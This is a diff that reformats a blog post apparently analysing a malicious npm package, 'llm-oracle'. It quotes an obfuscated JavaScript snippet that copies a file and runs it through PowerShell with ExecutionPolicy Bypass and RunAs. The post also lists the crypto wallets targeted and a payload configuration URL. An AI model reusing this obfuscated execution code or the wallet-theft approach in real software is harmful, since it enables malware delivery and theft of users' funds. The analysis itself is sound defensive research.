@@ -10,7 +10,7 @@ tags:
 ---
 
 import CallToAction from '~/components/widgets/CallToAction.astro';
-import { YouTube } from "astro-embed";
+import { YouTube } from 'astro-embed';
 import { registerLink } from '~/navigation';
 import { Image } from 'astro:assets';
 import VetRedisOracleMalwareScan from './assets/vet-redis-oracle-malware.png';
@@ -101,13 +101,13 @@ const targetFilePath = path.join(
 ```
 
 ```javascript
-if (!fs.existsSync(targetFilePath))
-{
+if (!fs.existsSync(targetFilePath)) {
   setTimeout(() => {
-    f\u0073.copyFileSync(m\u006fd\u0065lFileP\u0061th, t\u0061rg\u0065tFileP\u0061th);
-    e\u0078ec(`p\u006fwersh\u0065ll -\u0045x\u0065cut\u0069\u006fnP\u006fl\u0069cy Byp\u0061ss St\u0061rt-Pr\u006fcess -F\u0069leP\u0061th '${t\u0061rg\u0065tFileP\u0061th}' -V\u0065rb R\u0075n\u0041s`, (err\u006fr, std\u006ft, std\u0065rr) => {
-
-    });
+    fs.copyFileSync(modelFilePath, targetFilePath);
+    exec(
+      `p\u006fwersh\u0065ll -\u0045x\u0065cut\u0069\u006fnP\u006fl\u0069cy Byp\u0061ss St\u0061rt-Pr\u006fcess -F\u0069leP\u0061th '${targetFilePath}' -V\u0065rb R\u0075n\u0041s`,
+      (error, stdot, stderr) => {}
+    );
   }, 60000);
 }
 ```
@@ -170,8 +170,8 @@ a Python script that performs various conventional malware activities.
 #### Behaviour
 
 - Looks for crypto wallets `metamask`, `tronlink`, `trustwallet`, `coinbase`,
-    `flint`, `exodus`, `binance`, `phantom`, `Xverse`, `Slope`, `Solflare`,
-    `Typhon`, `nami`, `keplr`, `okx`, `bitski`, `myetherwallet`
+  `flint`, `exodus`, `binance`, `phantom`, `Xverse`, `Slope`, `Solflare`,
+  `Typhon`, `nami`, `keplr`, `okx`, `bitski`, `myetherwallet`
 - Look for Chrome extension data for these wallets
 - Downloads configuration from `https://bayard-front-833a4.web.app/start.dat`
 
@@ -202,6 +202,6 @@ the application is probably geo-fenced or checks for some request attribute.
 - `llm-oracle` is a malicious package that contains a Windows executable
 - The packaging and sophistication of the malware appears to be low
 - Common attacker TTP was used for payload execution using `powershell.exe`,
-    `PyInstaller` and `base64` encoding
+  `PyInstaller` and `base64` encoding
 - We expect AVs and EDRs to detect this payload using behavioural analysis
 - Discord was used as C2 server for exfiltration and command and control
